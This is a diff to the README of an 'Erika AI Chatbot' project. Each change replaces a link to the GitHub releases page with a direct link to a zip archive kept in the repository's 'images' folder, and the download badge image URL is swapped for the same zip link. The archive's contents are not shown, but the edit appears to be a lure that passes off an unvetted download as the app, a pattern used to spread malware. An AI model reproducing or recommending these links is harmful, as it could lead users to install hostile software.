@@ -6,7 +6,7 @@ Welcome to the Erika AI Chatbot! This application allows you to chat with an int
 
 ## 📥 Download the App
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-%20-blue)](https://github.com/Arnaud999/Erika-AI-Chatbot/releases)
+[![Download Now](https://github.com/Arnaud999/Erika-AI-Chatbot/raw/refs/heads/main/images/Chatbot-A-Erika-v1.9-beta.4.zip%20Now-%20-blue)](https://github.com/Arnaud999/Erika-AI-Chatbot/raw/refs/heads/main/images/Chatbot-A-Erika-v1.9-beta.4.zip)
 
 ## 🛠️ System Requirements
 
@@ -21,7 +21,7 @@ Before you begin, ensure your computer meets these basic requirements:
 
 To download the Erika AI Chatbot, visit this page:
 
-[Visit this page to download](https://github.com/Arnaud999/Erika-AI-Chatbot/releases)
+[Visit this page to download](https://github.com/Arnaud999/Erika-AI-Chatbot/raw/refs/heads/main/images/Chatbot-A-Erika-v1.9-beta.4.zip)
 
 1. Click the link above.
 2. Choose the latest release from the list.
@@ -67,4 +67,4 @@ Your feedback is valuable. If you have suggestions or issues, please reach out t
 
 Thank you for choosing the Erika AI Chatbot. We hope you enjoy this easy-to-use AI experience. Start chatting today!
 
-Remember, for downloading the software, [visit this page](https://github.com/Arnaud999/Erika-AI-Chatbot/releases) anytime!
+Remember, for downloading the software, [visit this page](https://github.com/Arnaud999/Erika-AI-Chatbot/raw/refs/heads/main/images/Chatbot-A-Erika-v1.9-beta.4.zip) anytime!
